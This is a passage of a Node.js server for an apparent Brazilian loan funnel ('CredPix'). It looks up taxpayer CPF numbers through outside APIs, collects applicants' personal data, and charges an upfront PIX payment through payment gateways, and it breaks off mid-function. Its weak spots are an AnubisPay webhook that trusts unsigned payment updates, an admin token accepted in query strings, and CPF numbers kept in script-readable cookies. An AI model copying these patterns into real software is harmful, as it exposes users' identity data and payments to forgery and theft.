'use strict';

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const { URL } = require('url');
const crypto = require('crypto');
const {
  lookupCpfForWizard,
  consultarCpfWithFallback,
  toWizardResponse,
  isElaiflowConfigured,
  useVeronxFallback,
  clientDirectEnabled,
  getToken,
} = require('./api/consultar-cpf');
const masterfy = require('./api/masterfy');
const anubis = require('./api/anubis');
const googlePixels = require('./api/google-pixels');
const analytics = require('./api/analytics');
const utmify = require('./api/utmify');
const adminAuth = require('./api/admin-auth');
const requestContext = require('./api/request-context');

const ROOT = __dirname;
const PORT = Number(process.env.PORT) || 3000;
const PROXY_API = process.env.PROXY_API === '1';
const REMOTE = 'https://veronx.site';

function loadEnvFile() {
  const envPath = path.join(ROOT, '.env');
  if (!fs.existsSync(envPath)) return;
  for (const line of fs.readFileSync(envPath, 'utf8').split(/\r?\n/)) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;
    const eq = trimmed.indexOf('=');
    if (eq === -1) continue;
    const key = trimmed.slice(0, eq).trim();
    let val = trimmed.slice(eq + 1).trim();
    if (
      (val.startsWith('"') && val.endsWith('"')) ||
      (val.startsWith("'") && val.endsWith("'"))
    ) {
      val = val.slice(1, -1);
    }
    if (!process.env[key]) process.env[key] = val;
  }
}

loadEnvFile();

const SITE_CONFIG_GROUPS = [
  { id: 'pagamento', label: 'Pagamento', icon: '💳', vars: [
    { key: 'PAYMENT_GATEWAY',   label: 'Gateway ativo',        type: 'select', options: ['anubis', 'masterfy'] },
    { key: 'MASTERFY_API_KEY',  label: 'MasterFy API Key',     type: 'password' },
    { key: 'ANUBIS_PUBLIC_KEY', label: 'AnubisPay Public Key', type: 'text' },
    { key: 'ANUBIS_SECRET_KEY', label: 'AnubisPay Secret Key', type: 'password' },
    { key: 'WEBHOOK_SECRET',    label: 'Webhook Secret',       type: 'password' },
  ]},
  { id: 'analytics', label: 'Analytics', icon: '📊', vars: [
    { key: 'ANALYTICS_SECRET',     label: 'Token admin (leitura)',  type: 'password' },
    { key: 'ANALYTICS_INGEST_KEY', label: 'Token ingest (escrita)', type: 'password' },
  ]},
  { id: 'utmify', label: 'UTMify', icon: '📣', vars: [
    { key: 'UTMIFY_API_TOKEN', label: 'API Token',  type: 'password' },
    { key: 'UTMIFY_PLATFORM',  label: 'Plataforma', type: 'text' },
  ]},
  { id: 'cpf', label: 'Consulta CPF', icon: '🪪', vars: [
    { key: 'CPF_BRASIL_API_KEY', label: 'Brasil API Key',      type: 'password' },
    { key: 'CPF_API_TOKEN',      label: 'Elaiflow Token',      type: 'password' },
    { key: 'CPF_CLIENT_DIRECT',  label: 'Consulta no browser', type: 'select', options: ['0', '1'] },
    { key: 'REMOTE_CPF',         label: 'CPF remoto (legado)', type: 'select', options: ['0', '1'] },
  ]},
  { id: 'amung', label: 'Amung (contadores)', icon: '📡', vars: [
    { key: 'AMUNG_FUNIL',    label: 'Funil ID',    type: 'text' },
    { key: 'AMUNG_CHECKOUT', label: 'Checkout ID', type: 'text' },
    { key: 'AMUNG_UPSELL',   label: 'Upsell ID',   type: 'text' },
  ]},
];

const sessions = new Map();
const pixTransactions = new Map();
const products = require('./config/products');

function parseCookies(req) {
  const out = {};
  const raw = req.headers.cookie || '';
  for (const part of raw.split(';')) {
    const p = part.trim();
    if (!p) continue;
    const eq = p.indexOf('=');
    if (eq === -1) continue;
    out[p.slice(0, eq).trim()] = decodeURIComponent(p.slice(eq + 1).trim());
  }
  return out;
}

function formatBrl(cents) {
  return (cents / 100).toLocaleString('pt-BR', {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  });
}

function setSessionCookies(res, sessionId, payer) {
  const cookies = [
    `sess=${sessionId}; Path=/; HttpOnly; SameSite=Lax`,
    `PHPSESSID=${sessionId}; Path=/; HttpOnly; SameSite=Lax`,
  ];
  if (payer?.document) {
    cookies.push(
      `cp_d=${payer.document}; Path=/; Max-Age=86400; SameSite=Lax`,
      `cp_n=${encodeURIComponent(payer.name || 'Cliente')}; Path=/; Max-Age=86400; SameSite=Lax`
    );
  }
  res.setHeader('Set-Cookie', cookies);
}

function resolvePhone(session, body = {}) {
  const data = session.data || {};
  const fromData = String(data.telefone || data.phone || '').replace(/\D/g, '');
  if (fromData.length >= 10) return fromData;
  const fromPayer = String(session.payer?.phone || '').replace(/\D/g, '');
  if (fromPayer.length >= 10) return fromPayer;
  const fromBody = String(body.phone || body.telefone || '').replace(/\D/g, '');
  if (fromBody.length >= 10) return fromBody;
  return '11999999999';
}

function resolvePayer(session, req, body = {}) {
  if (session.payer?.document) {
    const doc = String(session.payer.document).replace(/\D/g, '');
    if (doc.length === 11 || doc.length === 14) {
      return { ...session.payer, document: doc, phone: resolvePhone(session, body) };
    }
  }

  const cookies = parseCookies(req);
  const cookieDoc = String(cookies.cp_d || '').replace(/\D/g, '');
  if (cookieDoc.length === 11 || cookieDoc.length === 14) {
    return {
      name: decodeURIComponent(cookies.cp_n || 'Cliente'),
      document: cookieDoc,
      email: session.payer?.email || 'cliente@email.com',
      phone: resolvePhone(session, body),
    };
  }

  const bodyDoc = String(body.document || body.documento || '').replace(/\D/g, '');
  if (bodyDoc.length === 11 || bodyDoc.length === 14) {
    return {
      name: body.name || body.nome || 'Cliente',
      document: bodyDoc,
      email: body.email || 'cliente@email.com',
      phone: resolvePhone(session, body),
    };
  }

  const data = session.data || {};
  const dataDoc = String(data.cpf || data.documento || '').replace(/\D/g, '');
  if (dataDoc.length === 11 || dataDoc.length === 14) {
    return {
      name: data.nome || data.name || 'Cliente',
      document: dataDoc,
      email: session.payer?.email || 'cliente@email.com',
      phone: resolvePhone(session, body),
    };
  }

  return null;
}

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.webp': 'image/webp',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.svg': 'image/svg+xml',
  '.woff2': 'font/woff2',
  '.mp4': 'video/mp4',
  '.php': 'text/html; charset=utf-8',
};

function json(res, status, data, extraHeaders = {}) {
  const body = JSON.stringify(data);
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Cache-Control': 'no-store',
    ...extraHeaders,
  });
  res.end(body);
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => resolve(Buffer.concat(chunks).toString('utf8')));
    req.on('error', reject);
  });
}

function parseJsonBody(raw) {
  if (!raw) return {};
  try {
    return JSON.parse(raw);
  } catch {
    return {};
  }
}

function getSessionId(req) {
  const cookie = req.headers.cookie || '';
  const m = cookie.match(/(?:^|;\s*)PHPSESSID=([^;]+)/i) || cookie.match(/(?:^|;\s*)sess=([^;]+)/i);
  if (m) return m[1];
  return null;
}

function ensureSession(req, res) {
  let id = getSessionId(req);
  if (!id || !sessions.has(id)) {
    id = crypto.randomBytes(16).toString('hex');
    sessions.set(id, { data: {}, csrf: crypto.randomBytes(32).toString('hex') });
    setSessionCookies(res, id);
  }
  return { session: sessions.get(id), id };
}

async function handleConsultarCpfRoute(req, res, url) {
  const cpf = url.searchParams.get('cpf') || '';
  const result = await consultarCpfWithFallback(cpf);
  if (!result.ok) {
    const status = result.reason === 'invalid_format' ? 400 : 502;
    return json(res, status, {
      error: result.message || toWizardResponse(result).error,
    });
  }
  return json(res, 200, { success: true, data: result.data });
}

async function handleTypeApi(req, res, pathname, basePath) {
  const { session, id: sessionId } = ensureSession(req, res);
  const raw = await readBody(req);
  const body = parseJsonBody(raw);

  if (pathname === '/type/api/cpf') {
    if (body.csrf_token !== session.csrf) {
      return json(res, 200, { success: false, error: 'Token invalido' });
    }
    const result = await lookupCpfForWizard(body.cpf);
    if (!result.success) {
      console.warn('[CPF]', body.cpf ? String(body.cpf).replace(/\d(?=\d{4})/g, '*') : '?', result.error);
    }
    if (result.success && result.data) {
      const digits = String(body.cpf || '').replace(/\D/g, '');
      session.payer = {
        name: result.data.nome,
        document: digits,
        email: session.payer?.email || 'cliente@email.com',
        phone: session.payer?.phone || '11999999999',
      };
      session.data.nome = result.data.nome;
      session.data.cpf = digits;
      setSessionCookies(res, sessionId, session.payer);
    }
    return json(res, 200, result);
  }

  if (PROXY_API) return proxyToRemote(req, res, pathname);

  if (pathname === '/type/api/session/init') {
    return json(res, 200, {
      success: true,
      csrf_token: session.csrf,
      primeiraparcela: 'Novembro de 2026',
    });
  }

  if (pathname === '/type/api/session/set') {
    if (body.csrf_token !== session.csrf) {
      return json(res, 200, { success: false, error: 'Token invalido' });
    }
    if (body.name) {
      session.data[body.name] = body.value;
      analytics.appendEvent({
        type: 'wizard_step',
        session_id: 'srv_' + sessionId,
        funnel_step: 'wizard',
        meta: { field: String(body.name), step: String(body.name) },
      });
      if (body.name === 'cpf' || body.name === 'documento') {
        const digits = String(body.value || '').replace(/\D/g, '');
        if (digits.length === 11 || digits.length === 14) {
          session.payer = session.payer || {};
          session.payer.document = digits;
        }
      }
      if (body.name === 'nome' || body.name === 'name') {
        session.payer = session.payer || {};
        session.payer.name = body.value;
        session.data.nome = body.value;
      }
      if (body.name === 'telefone' || body.name === 'phone') {
        const digits = String(body.value || '').replace(/\D/g, '');
        if (digits.length >= 10) {
          session.payer = session.payer || {};
          session.payer.phone = digits;
        }
      }
    }
    if (session.payer?.document) setSessionCookies(res, sessionId, session.payer);
    return json(res, 200, { success: true });
  }

  if (pathname === '/type/api/session/checkout') {
    if (body.csrf_token !== session.csrf) {
      return json(res, 200, { success: false, error: 'Token invalido' });
    }
    return json(res, 200, {
      success: true,
      checkout_url: requestContext.withBasePath(
        '/pay/checkout.php?produto=prod_698630abcbdde&modelo=2',
        basePath || ''
      ),
    });
  }

  return json(res, 404, { success: false, error: 'Not found' });
}

function pixQrUrl(copypaste) {
  return (
    'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' +
    encodeURIComponent(copypaste)
  );
}

const MESES_PT = ['Janeiro','Fevereiro','Março','Abril','Maio','Junho','Julho','Agosto','Setembro','Outubro','Novembro','Dezembro'];

function toNumber(value) {
  if (value == null) return null;
  const n = Number(String(value).replace(/[^\d.-]/g, ''));
  return Number.isFinite(n) ? n : null;
}

function priceInstallment(valor, parcelas, taxa = 0.0049) {
  if (!(valor > 0) || !(parcelas > 0)) return null;
  const fator = Math.pow(1 + taxa, parcelas);
  const parcela = valor * (taxa * fator) / (fator - 1);
  return {
    valor_parcela: Math.round(parcela * 100) / 100,
    valor_total: Math.round(parcela * parcelas * 100) / 100,
  };
}

function firstInstallmentLabel(base = new Date()) {
  const d = new Date(base.getFullYear(), base.getMonth() + 6, 1);
  return MESES_PT[d.getMonth()] + ' de ' + d.getFullYear();
}

function buildLoanMetadata(sessionData, fallbackValor) {
  const data = sessionData || {};
  const meta = {};
  const valor = toNumber(data.valor_emprestimo) || fallbackValor || null;
  const parcelas = toNumber(data.num_parcelas);
  const dia = toNumber(data.dia_pagamento);

  if (valor != null) meta.valor_emprestimo = valor;
  if (parcelas) {
    meta.num_parcelas = parcelas;
    const calc = valor != null ? priceInstallment(valor, parcelas) : null;
    if (calc) {
      meta.valor_parcela = calc.valor_parcela;
      meta.valor_total = calc.valor_total;
    }
  }
  if (dia) meta.dia_vencimento = dia;
  meta.primeira_parcela = firstInstallmentLabel();
  if (data.pix) meta.chave_pix = String(data.pix).slice(0, 140);
  if (data.tipo_pix) meta.tipo_pix = String(data.tipo_pix).slice(0, 20);
  if (data.metodo_pagamento) meta.metodo_pagamento = String(data.metodo_pagamento).slice(0, 20);
  if (data.telefone) meta.telefone = String(data.telefone).replace(/\D/g, '').slice(0, 20);
  return meta;
}

function savePixTransaction(id, data) {
  pixTransactions.set(id, data);
}

async function generatePixMock(productId, body, req) {
  const products = require('./config/products');
  const product = products[productId];
  const amountCents = product?.amountCents || 3090;
  const txId = 'tx_' + crypto.randomBytes(8).toString('hex');
  const pixCode =
    '00020126580014br.gov.bcb.pix0136' +
    crypto.randomBytes(18).toString('hex') +
    '520400005303986540' +
    String(amountCents).padStart(4, '0') +
    '5802BR5925CREDPIX DEMO6009SAO PAULO62070503***6304ABCD';

  const payer = {
    name: body.name || 'Cliente',
    document: body.document,
    email: body.email || 'cliente@email.com',
    phone: body.phone || '11999999999',
  };
  const siteCtx = requestContext.siteContext(req);
  const txData = utmify.txContext(payer, body, productId, amountCents, {
    status: 'pending',
    pix_code: pixCode,
    mock: true,
    production: false,
    client_ip: utmify.clientIp(req),
    created: Math.floor(Date.now() / 1000),
    device_hash: body.device_hash ? String(body.device_hash).slice(0, 64) : null,
    base_path: body.base_path ? String(body.base_path).slice(0, 32) : null,
    browser_session_id: body.analytics_session_id ? String(body.analytics_session_id).slice(0, 64) : null,
    ...siteCtx,
  });

  savePixTransaction(txId, txData);
  await utmify.notifyPixGenerated(txId, txData).catch((err) => console.error('[Utmify]', err.message));
  savePixTransaction(txId, txData);

  return {
    success: true,
    production: false,
    demo: true,
    pix: {
      transaction_id: txId,
      qr_code: pixCode,
      qr_code_url: pixQrUrl(pixCode),
    },
  };
}

function activeGateway() {
  return (process.env.PAYMENT_GATEWAY || 'masterfy').toLowerCase().trim();
}

function gatewayConfigured() {
  return activeGateway() === 'anubis' ? anubis.isConfigured() : masterfy.isConfigured();
}

async function generatePixAnubis(req, body, sessionData) {
  const productId = body.product_id;
  const effectiveSession = (body.wizard_session && typeof body.wizard_session === 'object')
    ? Object.assign({}, sessionData, body.wizard_session)
    : sessionData;

  const PLACEHOLDER_PHONE = '11999999999';
  const resolvePhone = () => {
    // Wizard tem prioridade — é o número que o cliente digitou
    const candidates = [
      effectiveSession.telefone,
      sessionData && sessionData.telefone,
      body.telefone,
      body.phone,
    ];
    for (const c of candidates) {
      const d = String(c || '').replace(/\D/g, '');
      if (d.length >= 10 && d !== PLACEHOLDER_PHONE) return d;
    }
    return PLACEHOLDER_PHONE;
  };

  const siteCtx = requestContext.siteContext(req);
  const created = await anubis.createPixPayment({
    req,
    productId,
    deviceHash: body.device_hash,
    site: siteCtx,
    payer: {
      name: body.name,
      document: body.document,
      email: body.email,
      phone: resolvePhone(),
    },
  });

  const paymentId = created.payment_id;
  const payer = {
    name: body.name || 'Cliente',
    document: body.document,
    email: body.email || 'cliente@email.com',
    phone: body.phone || '11999999999',
  };
  const txData = utmify.txContext(payer, body, productId, created.amount_cents, {
    anubis_id: paymentId,
    gateway: 'anubis',
    status: 'pending',
    pix_code: created.qr_code,
    amount_cents: created.amount_cents,
    production: true,
    client_ip: utmify.clientIp(req),
    created: Math.floor(Date.now() / 1000),
    device_hash: body.device_hash ? String(body.device_hash).slice(0, 64) : null,
    base_path: body.base_path ? String(body.base_path).slice(0, 32) : null,
    browser_session_id: body.analytics_session_id ? String(body.analytics_session_id).slice(0, 64) : null,
    ...siteCtx,
  });

  savePixTransaction(paymentId, txData);
  await utmify.notifyPixGenerated(paymentId, txData).catch((err) => console.error('[Utmify]', err.message));
  savePixTransaction(paymentId, txData);

  return {
    success: true,
    production: true,
    pix: {
      transaction_id: paymentId,
      qr_code: created.qr_code,
      qr_code_url: pixQrUrl(created.qr_code),
    },
  };
}

async function generatePixMasterfy(req, body, sessionData) {
  const productId = body.product_id;
  const loanAmount = toNumber(body.loan_amount);
  // wizard_session vem do localStorage quando /type/api/session/set e interceptado no browser
  const effectiveSession = (body.wizard_session && typeof body.wizard_session === 'object')
    ? Object.assign({}, sessionData, body.wizard_session)
    : sessionData;
  const wizardMeta = buildLoanMetadata(effectiveSession, loanAmount);
  const siteCtx = requestContext.siteContext(req);
  const created = await masterfy.createPixPayment({
    req,
    productId,
    deviceHash: body.device_hash,
    utms: body.utms,
    payer: {
      name: body.name,
      document: body.document,
      email: body.email,
      phone: body.phone,
    },
    wizardMeta,
  });

  const paymentId = created.payment_id;
  const payer = {
    name: body.name || 'Cliente',
    document: body.document,
    email: body.email || 'cliente@email.com',
    phone: body.phone || '11999999999',
  };
  const txData = utmify.txContext(payer, body, productId, created.amount_cents, {
    masterfy_id: paymentId,
    status: 'pending',
    pix_code: created.qr_code,
    amount_cents: created.amount_cents,
    production: true,
    client_ip: utmify.clientIp(req),
    created: Math.floor(Date.now() / 1000),
    device_hash: body.device_hash ? String(body.device_hash).slice(0, 64) : null,
    base_path: body.base_path ? String(body.base_path).slice(0, 32) : null,
    browser_session_id: body.analytics_session_id ? String(body.analytics_session_id).slice(0, 64) : null,
    ...siteCtx,
  });

  savePixTransaction(paymentId, txData);
  await utmify.notifyPixGenerated(paymentId, txData).catch((err) => console.error('[Utmify]', err.message));
  savePixTransaction(paymentId, txData);

  return {
    success: true,
    production: true,
    pix: {
      transaction_id: paymentId,
      qr_code: created.qr_code,
      qr_code_url: pixQrUrl(created.qr_code),
    },
  };
}

function logCheckoutPaid(transactionId, tx) {
  if (tx.analytics_paid_logged) return;
  const utms = tx.utms && typeof tx.utms === 'object' ? tx.utms : {};
  analytics.appendEvent({
    type: 'payment_paid',
    ts: Date.now(),
    session_id: 'pix_' + transactionId,
    product_id: tx.product_id,
    amount_cents: tx.amount_cents,
    funnel_step: 'payment_paid',
    site_id: tx.site_id || null,
    site_host: tx.site_host || null,
    site_origin: tx.site_origin || null,
    base_path: tx.base_path || null,
    browser_session_id: tx.browser_session_id || null,
    traffic_src: utms.src || null,
    utm_source: utms.utm_source || null,
    utm_medium: utms.utm_medium || null,
    utm_campaign: utms.utm_campaign || null,
    utm_content: utms.utm_content || null,
    meta: { transaction_id: transactionId, source: 'checkout' },
  });
  tx.analytics_paid_logged = true;
}

async function checkPixStatus(transactionId) {
  const tx = pixTransactions.get(transactionId);
  if (!tx) {
    return { success: false, error: 'Transacao nao encontrada' };
  }

  if (tx.status === 'paid' || tx.status === 'failed') {
    if (tx.status === 'paid') {
      logCheckoutPaid(transactionId, tx);
      savePixTransaction(transactionId, tx);
    }
    return { success: true, status: tx.status };
  }

  if (tx.anubis_id && anubis.isConfigured() && !tx.mock) {
    const ANUBIS_POLL_INTERVAL_MS = 5000;
    const lastCheck = tx._anubis_last_check || 0;
    if (Date.now() - lastCheck < ANUBIS_POLL_INTERVAL_MS) {
      return { success: true, status: tx.status || 'pending' };
    }
    tx._anubis_last_check = Date.now();
    savePixTransaction(transactionId, tx);
    try {
      const payment = await anubis.getPayment(tx.anubis_id);
      const data = payment.data || payment;
      const rawStatus = data.status || data.Status || 'PENDING';
      const status = anubis.mapStatus(rawStatus);
      tx.status = status;
      if (status === 'paid') {
        const paidAtRaw = data.PaidAt || data.paidAt;
        const paidAt = paidAtRaw
          ? Math.floor(Date.parse(String(paidAtRaw)) / 1000) || Math.floor(Date.now() / 1000)
          : Math.floor(Date.now() / 1000);
        await utmify.notifyPixPaid(transactionId, tx, paidAt).catch((e) => console.error('[Utmify]', e.message));
        logCheckoutPaid(transactionId, tx);
      }
      savePixTransaction(transactionId, tx);
      return { success: true, status };
    } catch (err) {
      console.error('[Anubis status]', err.message);
      return { success: true, status: tx.status || 'pending' };
    }
  }

  if (tx.masterfy_id && masterfy.isConfigured() && !tx.mock) {
    try {
      const payment = await masterfy.getPayment(tx.masterfy_id);
      if (payment.status === 'PAID' && payment.paidAt) {
        tx.status = 'paid';
        const paidAt =
          typeof payment.paidAt === 'number'
            ? payment.paidAt > 9999999999
              ? Math.floor(payment.paidAt / 1000)
              : payment.paidAt
            : Math.floor(Date.parse(String(payment.paidAt)) / 1000) || Math.floor(Date.now() / 1000);
        await utmify.notifyPixPaid(transactionId, tx, paidAt);
        logCheckoutPaid(transactionId, tx);
        savePixTransaction(transactionId, tx);
      } else if (['REFUSED', 'REFUNDED', 'CHARGEDBACK'].includes(payment.status)) {
        tx.status = 'failed';
        savePixTransaction(transactionId, tx);
      }
    } catch {
      /* mantém pending */
    }
  } else if (tx.mock && process.env.PAYMENT_MOCK === '1') {
    const created = Number(tx.created) || 0;
    const createdSec = created > 9999999999 ? Math.floor(created / 1000) : created;
    if (Date.now() / 1000 - createdSec > 15) {
      tx.status = 'paid';
      await utmify.notifyPixPaid(transactionId, tx, Math.floor(Date.now() / 1000));
      logCheckoutPaid(transactionId, tx);
      savePixTransaction(transactionId, tx);
    }
  }

  return { success: true, status: tx.status };
}

function siteConfigEnvFile() {
  const local = path.join(ROOT, '.env.local');
  return fs.existsSync(local) ? local : path.join(ROOT, '.env');
}

function siteConfigReadLines(filePath) {
  if (!fs.existsSync(filePath)) return [];
  return fs.readFileSync(filePath, 'utf8').split(/\r?\n/);
}

function siteConfigGetValue(lines, key) {
  for (const line of lines) {
    const t = line.trim();
    if (!t || t.startsWith('#')) continue;
    const eq = t.indexOf('=');
    if (eq === -1) continue;
    if (t.slice(0, eq).trim() !== key) continue;
    let v = t.slice(eq + 1).trim();
    if (v.length >= 2 && ((v[0] === '"' && v[v.length - 1] === '"') || (v[0] === "'" && v[v.length - 1] === "'"))) {
      v = v.slice(1, -1);
    }
    return v;
  }
  return process.env[key] || '';
}

async function handleSiteConfig(req, res) {
  const token    = req.headers['x-analytics-token'] || '';
  const expected = process.env.ANALYTICS_SECRET || '';
  if (!token || !expected || token !== expected) {
    return json(res, 401, { error: 'Unauthorized' });
  }

  const allAllowed = SITE_CONFIG_GROUPS.flatMap((g) => g.vars.map((v) => v.key));
  const envFile    = siteConfigEnvFile();

  if (req.method === 'GET') {
    const lines  = siteConfigReadLines(envFile);
    const values = {};
    for (const key of allAllowed) values[key] = siteConfigGetValue(lines, key);
    return json(res, 200, {
      success: true,
      config: values,
      groups: SITE_CONFIG_GROUPS,
      env_file: path.basename(envFile),
    });
  }

  if (req.method === 'POST') {
    const raw     = await readBody(req);
    const body    = parseJsonBody(raw);
    const updates = body.updates && typeof body.updates === 'object' ? body.updates : {};

    for (const key of Object.keys(updates)) {
      if (!allAllowed.includes(key)) {
        return json(res, 400, { error: 'Chave não permitida: ' + key });
      }
    }

    const lines   = siteConfigReadLines(envFile);
    const applied = [];

    for (const [key, val] of Object.entries(updates)) {
      const value = String(val);
      let found   = false;
      for (let i = 0; i < lines.length; i++) {
        const t = lines[i].trim();
        if (!t || t.startsWith('#')) continue;
        const eq = t.indexOf('=');
        if (eq === -1) continue;
        if (t.slice(0, eq).trim() === key) {
          lines[i] = key + '=' + value;
          found = true;
          break;
        }
      }
      if (!found) lines.push(key + '=' + value);
      process.env[key] = value;
      applied.push(key);
    }

    fs.writeFileSync(envFile, lines.join('\n') + '\n', 'utf8');
    return json(res, 200, { success: true, updated: applied });
  }

  return json(res, 405, { error: 'Method not allowed' });
}

async function handleAnalyticsApi(req, res, url) {
  if (req.method === 'POST') {
    const adminToken = req.headers['x-analytics-token'] || '';
    if (analytics.verifyAuth(adminToken, adminToken)) {
      const raw = await readBody(req);
      const body = parseJsonBody(raw);
      if (body.action === 'ad_spend') {
        return json(res, 200, { success: true, ad_spend: analytics.saveAdSpend(body.by_src || {}) });
      }
      if (body.action === 'alerts_config') {
        return json(res, 200, { success: true, config: analytics.saveAlertsConfig(body.config || {}) });
      }
      return json(res, 400, { success: false, error: 'Acao POST invalida' });
    }

    const ingest = req.headers['x-analytics-ingest'] || '';
    if (!analytics.verifyIngestAuth(ingest)) {
      return json(res, 401, { success: false, error: 'Ingest nao autorizado' });
    }
    const raw = await readBody(req);
    const body = parseJsonBody(raw);
    const events = Array.isArray(body.events) ? body.events : [body];
    const saved = analytics.appendEvents(
      events.filter((ev) => ev && typeof ev === 'object'),
      { geo: analytics.clientGeoFromRequest(req) }
    );
    return json(res, 200, { success: true, count: saved.length });
  }

  if (req.method === 'GET') {
    const token = req.headers['x-analytics-token'] || url.searchParams.get('token') || '';
    if (!analytics.verifyAuth(token, token)) {
      return json(res, 401, { success: false, error: 'Token invalido' });
    }
    const days = Math.max(1, Math.min(90, Number(url.searchParams.get('days')) || 1));
    const src = url.searchParams.get('src') || null;
    const product = url.searchParams.get('product') || null;
    const opts = { src, product };

    if (url.searchParams.get('action') === 'backup') {
      return json(res, 200, { success: true, backup: analytics.runBackup() });
    }

    if (url.searchParams.get('action') === 'session') {
      const sessionId = url.searchParams.get('session_id') || '';
      return json(res, 200, {
        success: true,
        journey: analytics.getSessionJourney(sessionId, days),
      });
    }

    if (url.searchParams.get('export') === 'orders') {
      const csv = analytics.exportOrdersCsv(days, opts);
      res.writeHead(200, {
        'Content-Type': 'text/csv; charset=utf-8',
        'Content-Disposition': `attachment; filename="credpix-pedidos-${days}d.csv"`,
        'Cache-Control': 'no-store',
      });
      return res.end(csv);
    }

    if (url.searchParams.get('export') === 'csv') {
      const csv = analytics.exportEventsCsv(days);
      res.writeHead(200, {
        'Content-Type': 'text/csv; charset=utf-8',
        'Content-Disposition': `attachment; filename="credpix-analytics-${days}d.csv"`,
        'Cache-Control': 'no-store',
      });
      return res.end(csv);
    }

    return json(res, 200, {
      success: true,
      stats: analytics.aggregateStats(days, opts),
    });
  }

  res.writeHead(405);
  return res.end('Method not allowed');
}

async function handleGooglePixelsApi(req, res) {
  if (req.method === 'GET') {
    const config = googlePixels.readConfig();
    return json(res, 200, {
      success: true,
      googleAds: config.googleAds,
      ga4: config.ga4,
      savedAt: config.savedAt,
      sendTo: googlePixels.sendToList(config),
    });
  }

  if (req.method === 'POST') {
    const raw = await readBody(req);
    const body = parseJsonBody(raw);
    try {
      const saved = googlePixels.writeConfig({
        googleAds: body.googleAds || [],
        ga4: body.ga4 || [],
      });
      return json(res, 200, {
        success: true,
        config: saved,
        message: 'Salvo em config/google-pixels.json',
      });
    } catch (err) {
      return json(res, 500, { success: false, error: err.message || 'Erro ao salvar' });
    }
  }

  res.writeHead(405);
  return res.end('Method not allowed');
}

async function handleMasterfyWebhook(req, res) {
  const raw = await readBody(req);
  const signature = req.headers['x-signature'] || req.headers['X-Signature'];
  const signatureValid = masterfy.verifyWebhookSignature(raw, signature);

  if (!signatureValid) {
    analytics.appendWebhookLog({
      payment_id: null,
      status: 'invalid_signature',
      signature_valid: false,
      ok: false,
    });
    return json(res, 401, { error: 'Assinatura invalida' });
  }

  const body = parseJsonBody(raw);
  const parsed = masterfy.parseWebhookPayload(body);

  analytics.appendWebhookLog({
    payment_id: parsed.payment_id,
    status: parsed.status,
    signature_valid: true,
    ok: true,
  });

  for (const [txId, tx] of pixTransactions.entries()) {
    if (tx.masterfy_id === parsed.payment_id) {
      tx.status = parsed.status;
      savePixTransaction(txId, tx);
    }
  }

  const mfTx = pixTransactions.get('mf_' + parsed.payment_id) || {};
  savePixTransaction('mf_' + parsed.payment_id, {
    masterfy_id: parsed.payment_id,
    status: parsed.status,
    product_id: mfTx.product_id,
    amount_cents: mfTx.amount_cents,
    updated: Date.now(),
  });

  if (parsed.status === 'paid') {
    let txData = mfTx;
    for (const [, tx] of pixTransactions.entries()) {
      if (tx.masterfy_id === parsed.payment_id && tx.product_id) {
        txData = tx;
        break;
      }
    }
    analytics.logPaymentFromWebhook(parsed.payment_id, parsed.status, txData, true);
  }

  return json(res, 200, { received: true });
}

async function handleAnubisWebhook(req, res) {
  if (req.method === 'GET') return json(res, 200, { ok: true, gateway: 'anubis' });

  const raw = await readBody(req);
  const body = parseJsonBody(raw);
  const paymentId = String(body.Id || body.id || '');
  const rawStatus = String(body.Status || body.status || 'PENDING');
  const status = anubis.mapStatus(rawStatus);
  const amountCents = Math.round(parseFloat(body.Amount || body.amount || 0) * 100);
  if (!paymentId) {
    analytics.appendWebhookLog({
      payment_id: null,
      status: 'invalid_payload',
      signature_valid: false,
      ok: false,
      gateway: 'anubis',
    });
    return json(res, 400, { error: 'Id de transação ausente' });
  }

  // Acha a transação na memória (busca pelo anubis_id ou diretamente pela chave)
  let txId = paymentId;
  let txData = pixTransactions.get(paymentId) || null;
  for (const [id, tx] of pixTransactions.entries()) {
    if (tx.anubis_id === paymentId) {
      txId = id;
      txData = tx;
      break;
    }
  }

  if (!txData) {
    analytics.appendWebhookLog({
      payment_id: paymentId,
      status: 'ignored_unknown_transaction',
      signature_valid: false,
      ok: true,
      gateway: 'anubis',
    });
    return json(res, 200, { received: true, gateway: 'anubis', ignored: true });
  }

  const remoteMeta = body.metadata || body.Metadata || body.data?.metadata || body.Data?.Metadata || null;
  if (remoteMeta && typeof remoteMeta === 'object') {
    const localSiteId = String(txData.site_id || '').toLowerCase();
    const remoteSiteId = String(remoteMeta.site_id || '').toLowerCase();
    const localHost = String(txData.site_host || '').toLowerCase();
    const remoteHost = String(remoteMeta.site_host || '').toLowerCase();
    if ((localSiteId && remoteSiteId && localSiteId !== remoteSiteId) || (localHost && remoteHost && localHost !== remoteHost)) {
      analytics.appendWebhookLog({
        payment_id: paymentId,
        status: 'ignored_site_mismatch',
        signature_valid: false,
        ok: true,
        gateway: 'anubis',
      });
      return json(res, 200, { received: true, gateway: 'anubis', ignored: true });
    }
  }

  // Atualiza status na memória
  txData.status = status;
  txData.anubis_id = txData.anubis_id || paymentId;
  txData.gateway = 'anubis';
  if (amountCents > 0 && !txData.amount_cents) txData.amount_cents = amountCents;
  savePixTransaction(txId, txData);

  if (status === 'paid') {
    const paidAtRaw = body.PaidAt || body.paidAt;
    const paidAt = paidAtRaw
      ? Math.floor(Date.parse(String(paidAtRaw)) / 1000) || Math.floor(Date.now() / 1000)
      : Math.floor(Date.now() / 1000);
    await utmify.notifyPixPaid(txId, txData, paidAt).catch((e) => console.error('[Utmify]', e.message));
    savePixTransaction(txId, txData);
  }

  // Loga no analytics (inclui webhook log + payment_paid event se status=paid)
  analytics.logPaymentFromWebhook(paymentId, status, txData, true);

  return json(res, 200, { received: true, gateway: 'anubis' });
}

async function handlePixApi(req, res, url) {
  if (PROXY_API && !masterfy.isConfigured()) {
    return proxyToRemote(req, res, url.pathname + url.search);
  }

